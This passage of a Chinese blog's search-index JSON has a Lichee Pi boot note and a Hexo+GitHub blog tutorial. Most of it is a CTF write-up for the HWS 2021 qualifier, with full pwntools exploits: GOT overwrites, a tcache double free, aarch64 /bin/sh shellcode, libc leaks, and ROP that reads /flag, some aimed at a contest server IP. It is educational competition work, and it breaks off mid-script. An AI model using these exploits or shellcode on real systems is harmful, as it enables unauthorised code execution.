TX处，并将“usb转ttl工具”接地。\n\n   ![](connect-lichee.png)\n\n   ![](connect-usb-ttl.png)\n\n3. 使用usb otg给zero供电。这时就可以在电脑端串口工具中查看串口输出了。\n\n   ![](connect-whole.png)\n\n4. 启动完成后，使用root登录系统！\n\n   ![](success.png)\n\n通过以上实验，确定了自己编译的镜像是可以在荔枝派zero上启动并运行操作系统的。所以接下来的计划是，深入学习uboot、kernel和文件系统这三个部分，理解从启动到系统运行的每一个过程和涉及的东西。希望最后能定制一个自己的系统出来~\n\n\n\n\n\n\n\n","tags":["动手实践"],"categories":["lichee-zero"]},{"title":"如何使用 hexo + github 搭建属于自己的博客","url":"/2021/02/16/build-a-blog/","content":"\n\n\n> windows下利用github和hexo搭建博客\n\n# 环境依赖\n\n- [node.js](https://nodejs.org/en/)\n\n- [git](https://git-scm.com/download/win)\n\n在官网中下载node.js和git，并完成安装。\n\n分别执行以下命令，若返回版本号，则表明安装成功。\n\n```\ngit --version\nnode --version\n```\n\n# github仓库\n\n\n\n# 设置ssh\n\n```\nssh-keygen -t rsa -C \"xxx@163.com\"\n```\n\n将本地`id_rsa.pub`的内容，拷贝到github设置中的`SSH and GPG keys`。\n\n# 安装hexo\n\n```shell\nnpm install -g hexo-cli\n```\n\n新建一个目录，然后初始化该目录\n\n```shell\nmkdir blog\nhexo init blog    # 初始化\ncd blog\nnpm install    # 安装组件\n```\n\n本地预览：\n\n```shell\nhexo g    # 生成页面\nhexo s    # 启动预览\n# 若预览端口被占用使用hexo server -p 5000来更改端口号\n```\n\n本地博客测试成功后，将其上传到github部署\n\n```shell\n# 安装hexo-deployer-git\nnpm install hexo-deployer-git --save \n# 修改_config.yml文件末尾的Deployment部分为\ndeploy:\n  type: git\n  repository: git@github.com:用户名/用户名.github.io.git\n  branch: master\n# 使用如下命令上传到github，就可以使用https://用户名.github.io进行访问\nhexo d\n```\n\n\n\n# 新建博文\n\n## 自动创建\n\n进入博客所在目录，右键打开Git Bash Here，创建博文。在source/_posts目录下能看到一个My-New-Post.md文件。\n\n```shell\nhexo new \"My New Post\"\n```\n\n将博文上传到github并发布\n\n```shell\nhexo g # 生成页面\nhexo d # 部署发布\n```\n\n## 手动创建\n\n在source/_posts目录下新建一个md文件，并在文件开头加入如下格式的front-matter\n\n```markdown\n---\ntitle: Hello World # 标题\ndate: 2019/3/26 hh:mm:ss # 时间\ncategories: # 分类\n- Diary\ntags: # 标签\n- PS3\n- Games\n---\n\n摘要\n<!--more-->\n正文\n```\n\n# 更换主题\n\n[hexo themes](https://hexo.io/themes/)\n\n```shell\ncd /f/blog/git clone https://github.com/liuyib/hexo-theme-stun.git themes/stunnpm install --save hexo-renderer-pug    # 安装依赖\n```\n\n然后修改_config.yml\n\n```\ntheme: stun\n```\n\n# 参考\n\n[hexo+github搭建个人博客](https://www.cnblogs.com/thanksblog/p/12900165.html)\n\n[使用 Hexo+GitHub 搭建个人免费博客教程（小白向）](https://zhuanlan.zhihu.com/p/60578464)\n\n","categories":["基础技能"]},{"title":"HWS 2021 冬令营选拔赛","url":"/2021/02/03/hws2021-winter/","content":"\n一共是四道题目的wp：\n\n- emarm\n- ememarm\n- justcode\n- blinkblink\n\n后面三个题暂时以word的格式上传，等我有空把博客框架改完了再整理。\n\n# emarm\n\n题目文件：[emarm](emarm_100.zip)\n\n## 分析二进制\n\n通过字符串“password”在IDA中定位到main函数位置，并create function\n\n![](emarm1.png)\n\n分析题目逻辑后知道，只要绕过/dev/urandom就可以任意地址写。\n\n这里只比较的n是根据输入调整的，因此我们只输入一个字节的，就只比较最低字节的内容。2^8的爆破强度是能接受的。（看了另一篇wp，说可以直接输入’\\0’来绕过strncmp，就不用爆破了）\n\n![](emarm2.png)\n\n绕过urandom限制后，有一个天然的任意地址写。\n\n## 泄露libc\n\n本地调试libc基址是0x4000847000\n\n![](emarm3.png)\n\n利用任意地址写将atoi改成printf，通过输入%n$x泄露寄存器或栈上的信息\n\n![](emarm4.png)\n\n0x40008676e0 - 0x4000847000 = 0x206e0\n\n泄露远程的值，为0x8506e0。对应远程libc地址为：0x40008506e0 – 0x206e0 = 0x4000830000\n\n![](emarm5.png)\n\n泄露脚本：\n\n```python\nfrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# fread 0x412060 = 4268128\n# atoi 0x412020 = 4268064\n# bl .puts :0x400C64 0x400BA4 ...\n# lb .printf : 0x400c30\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        #pr = process(['qemu-aarch64','-L','./','emarm'])\n        pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268064')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x400c30))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('%9$x')\n        res = pr.recv()\n        #print p64(res.ljust(8,'\\x00'))\n        print res\n        pr.recv()\n        \n        pr.interactive()\n        break\n    except EOFError:\n        pr.close()\n\n```\n\n\n\n## 改got表项执行\"/bin/sh\"\n\n利用任意地址写改got表项。\n\n搜索给定libc，存在可用gadget，选最后一个gadget，约束条件较少。\n\n![](emarm6.png)\n\n选择fread函数，因为可以控制v8为0。\n\n![](emarm7.png)\n\nexp如下\n\n```python\nrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n#pr = process('qemu-aarch64','-L','./','-g','1234','./emarm')\n#pr = process('qemu-aarch64','-L','./','./emarm')\n\nlibc_base = 0x4000830000\nexec_addr = libc_base + 0x63e80\n# 40008AAE80\n# fread 0x412060 = 4,268,128\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268128')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(exec_addr))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('0')\n        pr.interactive()\n        break\n    except EOFError:\n        pr.close()\n\n```\n\n拿到flag如下：\n\n![](emarm8.png)\n\n## 另一种解法\n\n通过多次写，将shellcode写到内存，然后跳转执行\n\n```python\nfrom  pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# fread 0x412060 = 4268128\n# 0x411f70 = 4267888\n\nsh1 = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\"\nsh2 = \"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nsh3 = \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\"\nsh4 = \"\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nsh5 = \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        pr = process(['qemu-aarch64','-L','./','emarm'])\n        #pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268128')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x400be4))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n        pr.recv()\n\n        pr.send(str(0x412080))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh1)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n        pr.recv()\n    \n        pr.send(str(0x412088))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh2)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412090))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh3)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412098))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh4)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x4120a0))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh5)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412060))\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x412080))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.interactive()\n        break\n    except EOFError:\n        pr.kill()\n\n```\n\n\n\n# ememarm\n\n题目文件：[ememarm](ememarm_200.zip)\n\n## 分析\n\narm64二进制程序，动态链接，去符号表。\n\n```shell\n$ file ememarm\nememarm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=407173e699ec0b33c41ef419ba897062bcee5626, stripped\n```\n\ngot表可写，栈保护开了，开了NX（但用普通qemu-arm起起来的arm程序，这一项并不准确），未开随机化。\n\n```shell\n$ checksec ememarm\n[*] '/home/bling/ctf-0128/ememarm/ememarm'\n    Arch:     aarch64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n### 主要功能\n\n程序刚开始的时候，会malloc一个0x20大小的堆块，并让我们输入0x18大小的内容。这个堆块是用作头结点的，后面申请的堆块（note块）都会链接上来。\n\n```c\n  printf(\"hello every one welcom my note  ~~%lld\\n\", &unk_412070);\n  buf = malloc(0x20uLL);\n  read(0, buf, 0x18uLL);\n```\n\n程序主要是3个功能：\n\n```c\n__int64 sub_4008E4()\n{\n  puts(\"1. request\");\n  puts(\"2. print\");\n  puts(\"3. edit\");\n  return puts(\"you choice: \");\n}\n```\n\n#### request\n\n```c\n  buf = (char *)malloc(0x20uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n```\n\n申请0x20大小的堆块，写入两个8字节内容。写完后会让你选择是否delete，这时输入1，会将这个堆块链入头节点或者上一个请求的；输入其他数字默认不会链入。\n\n```c\n          puts(\"do you want delete?\");\n          __isoc99_scanf(\"%d\", &v2);\n          if ( v2 == 1 )\n            link_it(buf, v7);\n        }\n```\n\n#### print\n\nprint函数中没有任何有用的信息，至做了参数被写死的puts输出。\n\n这个函数被我用来当做调试的断点，很好用！\n\n#### edit\n\nedit函数中功能较多，问题也出在这儿。\n\n```c\nif ( (unsigned int)read(0, v5, 0x18uLL) == 24 )\n    *((_BYTE *)v5 + 24) = 0;\nfree(v5[3]);\nresult = (ssize_t)v5;\nv5[3] = 0LL;\n```\n\n第二行，将v5指向的地址当做BYTE类型，因此在赋值0时，只给最低1个byte置0了，这是一个off by null漏洞。导致后一行free操作并没有free预期的地址，产生了偏移，利用这个可以构造double free。题目给定的libc是有tcache的，这让我们的double free更好利用了。\n\n#### surprise\n\n除了以上这三个功能外，还有一个隐藏功能——surpise()。它存在的目的就是为了让我们可以构造多次double free。因为同一大小的tcache堆块链，只能构造一次double free。\n\n```shell\n  buf = (char *)malloc(0x30uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n  return buf;\n```\n\n### 关键点\n\n1. 通过链表寻找note块，因此可以劫持note块链的走向\n2. double free的同时，实现对next note的劫持。产生一次攻击，两个任意地址写的效果！\n\n## 利用\n\n### ret2shellcode\n\n> 由于arm pwn题通常是跑在qemu里的，qemu中默认不会有NX，因此大部分arm pwn都可以使用ret2shellcode的方法。\n\nshellcode植入的地址选择：比较随意，这里以.bss段后的0x412080作为shellcode起始地址。\n\n过程见如下exp\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nshellcode1 = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\"\nshellcode2 = \"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode3 = \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\"\nshellcode3 += \"\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode3 += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nscanf_got = myelf.got['__isoc99_scanf']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - 包含\\x00项，利用‘\\x31’构造一个伪块，达到写next note地址的目的\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - 一次double free，可以构造两次任意地址写\nrequest_i(p64(0x412080),p64(0x0),0)\nrequest_i(p64(0x0),p64(0x412090),0)\nrequest_i(shellcode1,shellcode2,0)\t# 第一次写，将shellcode1和shellcode2(0x10 bytes)写到0x412080\n# one edit\nedit_i(4,shellcode3)\t#第二次写，将shellcode3（0x18 bytes）写到0x412090\n\n# re-init env : 0x20大小的note链经过上面的double free已经无法继续用了。所以需要重新初始化note链，使用题目中预留的0x30大小的note。这里需要通过调试定位各note的位置。\nedit_i(1,'2'*0x10)   # 1\nsuprise_i('1','1',1) # 2\nsuprise_i('1','1',1) # 3 - 包含\\x00项\nsuprise_i('1','1',1) # 4\nsuprise_i('1','1',1) # 5\nsuprise_i('1','1',1) # 6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - 这里同样可以构造两次任意地址写，不过我们只需要写一次就够了\nsuprise_i(p64(scanf_got),p64(0x1),0)\nsuprise_i(p64(0x0),p64(0x0),0)\nsuprise_i(p64(0x412080),p64(0x412080),0)  # 将scanf的got表项写成了shellcode地址。surprise()执行过后，在执行`__isoc99_scanf(\"%d\", &v2)`时，由于scanf已被劫持，故将会跳转到我们的shellcode执行\n#print_i(1)  # debug\n\npr.interactive()\n```\n\n### execve(\"/bin/sh\",0,0)\n\n#### 一次泄露libc一次getshell\n\nprintf的第一个参数(格式化字符串)是一个地址，因此可以利用free(v[3])，将v[3]指向构造的格式化字符串，将free got表项改为printf的，就可以实现printf(v[3])泄露栈中跟libc相关的地址了。\n\n利用printf泄露栈中的libc_start_main函数地址：\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\nprintf_plt = myelf.plt['printf']\n\n\ninit_data = '%9$p'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc\nrequest_i(p64(0x412038),p64(0),0)       \nrequest_i(p64(0x0),p64(0x412038),0)     \nrequest_i(p64(printf_plt),'\\x68',0)\n\npr.recvuntil('you choice:')\npr.sendline(str(0x5))\n\npr.recvuntil(\"bye bye bye!!\\n\")\npr.recvline()\nstart_addr = pr.recv()[2:]\nstart_int = int(start_addr,base=16)\nlog.warn('libc_start_main+224: {:x}\\n'.format(start_int))\n\npr.interactive()\n```\n\n#### 泄露与getshell二合一\n\n泄露libc时只能泄露低32位，不过没关系，写会got表时找已经解析过的项，只需要将低32位填回去就可以了\n\n\n\n对于tcache而言，double free + three malloc可以达成一次任意地址写任意值。但是由于本题要泄露libc必须更改free的got表项，会导致后续无法再利用double free任意写，也就无法get shell。\n\n但是！本题中还有一个隐藏的不易被发现的任意地址写，那就是申请的note链表的next这个位置。通过错位释放note，再request，可以达到改next指针为目标地址的目的。然后再edit note时，输入的内容就会写入目标地址。\n\n以上两种方式都可以实现任意地址写，但是思考了很久，却始终无法通过线性组合达到get shell的目的。最后采用先free两次，再malloc两次（这个时候已经确定好下次malloc时堆管理器会分配给我的chunk了），利用两次edit（后一次还利用了off by null）实现free_got改为puts_plt并泄露setbuf的got表项从而得到libc的低32位。\n\n分析过程见下图：\n\n\n\nexp如下\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# double free - two malloc\nrequest_i(p64(0x412000),p64(0),0)       # 提前布局利用double free要改写的地址，改malloc为gadget\nrequest_i(p64(0x0),p64(0x412038),0)     # 使note链中最后一个note指向free_got\n\n# two edit  - free(v5[3]) ==> puts(0x412000)\nedit_i(4,p64(puts_plt))\t\t\t\t\t# 更改链上最后一个note的值，即将free_got表项改为puts_plt\nedit_i(3,'a'*0x18)\t\t\t\t\t\t# 更改倒数第二个note的值，给其0x18字节，从而触发低字节写零，将v5[3]从0x412038变成0x412000，通过puts(0x412000)，我们可以得到setbuf表项(0x412000)中的实际地址。最后利用题目给定的libc，确定真实libc加载地址的后32位。（puts时由于\\x00截断，只能接收到低32位）《或者考虑使用printf搭配%p》\npr.recvline()   # 接收一个空行\naddr1 = pr.recvline()\nsetbuf_addr_32 = u32(addr1[:-1].ljust(4,'\\x00'))\nbase_addr_32 = setbuf_addr_32 - mylibc.symbols['setbuf']   # 计算libc\nget_shell_addr = base_addr_32 + 0x63e80         # one gadget = 0x63e80\n\n# double free - last malloc\nrequest_i('\\x08',p32(get_shell_addr),0)     #double free中的第三次malloc，实现任意地址写任意值。将malloc的got表项写成get shell的gadget，只写低32位。同时最好保持前一项不变，通过题目给的libc可以确定前一项的最低一个字节是'\\x08'\n\npr.recvuntil('you choice:')\npr.sendline(str(0x1))\t\t\t\t# 触发request中的malloc\n# print_i(1)  \t\t\t\t\t\t# debug\npr.interactive()\n```\n\n### backup\n\n另一种方法实现两次任意地址写：利用0x20和0x30的链各double free一次，加上错位构造chunk的一次，一共有四次任意地址写任意值的能力。\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\npr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n    \ninit_data = 'a'*8 + 'b'*8 + 'c'*8\npr.sendafter(\"4268144\",init_data)\n\nsuprise_i('1','1',1) #1\nrequest_i('1','1',1) #2\n\nrequest_i('1','1',1) #3\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\nrequest_i('1','1',1) #7\n\nsuprise_i('1','1',1) #8\nrequest_i('1','1',1) #9\nrequest_i('1','1',1) #10\nrequest_i('1','1',1) #11\nrequest_i('1','1',1) #12\n\nprint_i(1)\nedit_i(11,'1'*0x18)\nedit_i(10,'2'*0x18)\nsuprise_i(p64(0x412078),'1',1)      # mylibc.got['free'] : 0x412038  # .bss after : 0x412080\nsuprise_i('\\x78','1',0)        # x - \\x78 - 0x412078\nsuprise_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nedit_i(5,'3'*0x18)\nedit_i(4,'3'*0x18)\nrequest_i(p64(0x412088),'1',1)\nrequest_i('\\x88','1',0)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nrequest_i(p64(0x412088),'1',1)\nrequest_i('1'*8,'1',0)\nprint_i(1)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\nprint_i(1) \n\npr.interactive()\n```\n\n\n\n# justcode\n\n题目文件：[justcode](justcode_200.zip)\n\n## 分析\n\n本程序在开头做了seccomp的限制，导致无法调用execve系统调用，因此无法get shell，考虑通过open read write将flag读出来。另外，由于程序中没有可写可执行的段，因此利用方式基本确定只能是ROP。\n\n![](justcode1.png)\n\n查看反汇编的源码：\n\n![](justcode2.png)\n\n这个函数中，read144个字节时由于覆盖到canary会导致进入错误处理函数。\n\n![](justcode3.png)\n\n这个函数中scanf使用不正确，导致在栈上取值（v1）做地址写入任意内容。\n\n![](justcode4.png)\n\n以上俩函数在main函数中是并行的关系，因此他们的栈会复用。也就是说我们可以控制v1的值，那么就达到了任意地址写。\n\n\n\n## 利用\n\n（1）sub_400c47  -->（2）sub_400cca  --> （3）sub_400c47\n\n（1）布置好栈中的数据，控制（2）中需要用到的v1为evil_addr\n\n（2）进入后输入evil_content，达到任意地址写\n\n（3）回到有栈溢出的函数，触发`__stack_chk_fail`。这里选择`__stack_chk_fail`是因为，got表项中的其他函数都已经调用过了，存在表项中的地址都是大于32位的，我们无法\n\nps：由于（2）中v1和%d的限制，在构造evil_addr和evil_content时要注意！\n\n![](justcode5.png)\n\n整理下思路：\n\nsub_400c47中布置好栈，控制下一个函数的v1值，我们选`__stack_chk_fail`的got表项；\n\nsub_400cca scanf时输入gadget地址，达到当调用`__stack_chk_fail`时去执行我们的gadget；\n\nsub_400c47中栈溢出导致canary检测时出错并进入`__stack_chk_fail`，即gadget。\n\n### 任意地址写\n\n```python\nv1 = myelf.got['__stack_chk_fail']\npayload1 = p64(0) + p32(0) + p32(v1) + 'aaaaaaaabbbbbbbb'\npr.recvuntil(\"name:\")\npr.sendline(payload1)\n\n## 3 \ninit_gadget = '4198050'    # 0x400ea2 - pop_r15_re_gadget\npr.recvuntil(\"id:\")\npr.sendline(init_gadget)\npr.recvuntil(\"info:\")\npr.sendline('oooooooo')\n```\n\ngadget选择了libc_csu_init的通用gadget\n\n### 泄露libc\n\n```python\n# init1 = 0x400e96\n# init2 = 0x400e80\nputs_got = myelf.got['puts']\npayload2 = flat([0x400e96,0,0,1,puts_got,0,0,puts_got,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# leak libc\nlibc_base = u64(pr.recvline()[:-1].ljust(8,'\\x00')) - mylibc.symbols['puts']\n```\n\n### read(0,0x6020e0,0x40)\n\n布置open，write，“/flag”到一个可写可读的段，这里选择.bss段后任意一个地址\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,0x40,0x6020e0,0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write open,write,/flag to 0x6020e0,0x6020e8,0x6020f0\nopen_addr = libc_base + mylibc.symbols['open']\nwrite_addr = libc_base + mylibc.symbols['write']\ncont1 = flat([open_addr,write_addr,'/flag'])\npr.send(cont1)\n```\n\n### open(“/flag”,0)\n\npwn题里0 1 2分别给stdin stdout stderr占据，open返回的fd一般为3，如果不是可以依次往后尝试。\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e0,0x0,0x0,0x6020f0,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# fd = open('/flag',0),fd = 3?\n```\n\n### read(3,0x602110,100)\n\n用open(“/flag”)返回的fd将flag内容读取到一段可写可读的地址空间，这里依旧选.bss段后的任意一端地址。\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,read_got,100,0x602110,3,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# read(3,0x602110,100)\n```\n\n### write(1,0x602110,100)\n\n将上一步写入到地址空间中flag的内容通过write输出到stdout，这样我们就可以在本地接收到了！\n\n```python\nread_got = myelf.got['read']\npayload2 = flat([0x400e96,0,0,1,0x6020e8,100,0x602110,1,0x400e80],[0,0,0,0,0,0,0,0x400c47])\npayload3 = payload2 + 'a'*(144-len(payload2))\npr.recvuntil(\"name:\")\npr.send(payload3)\npr.recvline()\npr.recvline()\n\n# write(1,0x602110,100)\n\nres = pr.recvline()\nprint res\n```\n\n拿到flag\n\n![](justcode6.png)\n\n## 完整exp\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./justcode')\nmylibc = ELF('./libc-2.23.so')\n#mylibc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')\n\n#pr = process(myelf.path)\npr = remote('183.129.189.60',10032)\n\npr.recvuntil(\"your code:\")\npr.sendline('1')\npr.sendline('1')\npr.sendline('2')\npr.sendline('1')\n## call _puts : 0x400da0\n## jmp __chk_fail : 0x400960\n## leave :0x400cc8\n\n## 1\npr.recvuntil(\"name:\")\n#gdb.attach(pr,'b *0x400ea0 \\n c')\npr.sendline()\n\n## 2\nv1 = myelf.got['__stack_chk_fail']\npayload1 = p64(0) + p32(0) + p32(v1) + 'aaaaaaaabbbbbbbb'\npr.recvuntil(\"name:\")\npr.sendline(payload1)\n\n## 3 \ninit_gadget = '4198050'    # 0x400ea2 - pop_r15_re_gadget\npr.recvuntil(\"id:\")\npr.sendline(init_gadget)\npr.recvuntil(\"info:\")\npr.sendline('oooooooo')\n\n## 4\n# init1 = 0x400e96\n# init2 = 0x400e80\nputs_got = myelf.got['puts']\npayload2 = 